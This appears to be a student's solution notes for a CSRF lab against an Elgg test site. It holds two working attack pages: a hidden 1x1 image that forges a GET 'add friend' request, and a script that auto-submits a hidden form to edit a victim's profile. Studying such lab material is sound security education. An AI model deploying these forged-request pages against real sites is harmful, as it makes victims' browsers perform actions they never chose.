## task 2

```html
<html>
<body>
<h1> This page forges an HTTP GET request. </h1>
<img src="http://www.csrflabelgg.com/action/friends/add?friend=45"
 alt="image" width="1" height="1" />
</body>
</html>
```

## task 3

```html
<html>
<body>
<h1> This page forges an HTTP POST request. </h1>
<script type="text/javascript">
function forge_post()
{
	var fields;
	fields = "<input type='hidden' name='name' vaule='Alice'>";
	fields += "<input type='hidden' name='description' \
		            value='Samy is my hero'>";
	fields += "<input type='hidden' name='accesslevel[description]' \
		                           value='2'>";
	fields += "<input type='hidden' name='guid' value='42'>";
	
	var p = document.createElement("form");
	p.action = "http://www.csrflabelgg.com/action/profile/edit";
	p.innerHTML = fields;
	p.method = "post";
	document.body.appendChild(p);
	p.submit();
}

window.onload = function() { forge_post(); }
</script>
</body>
</html>
```
it will redirect automaticly....
